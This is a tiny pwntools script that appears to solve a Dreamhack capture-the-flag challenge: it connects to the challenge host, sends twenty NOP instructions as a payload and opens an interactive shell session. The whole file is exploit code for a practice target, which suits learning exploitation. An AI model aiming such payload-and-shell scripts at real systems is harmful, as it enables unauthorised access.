#!/usr/bin/env python2

from pwn import *

HOST = "host1.dreamhack.games"
PORT = 20815

conn = remote(HOST, PORT)

conn.sendline(asm("nop")*0x14)
conn.interactive()
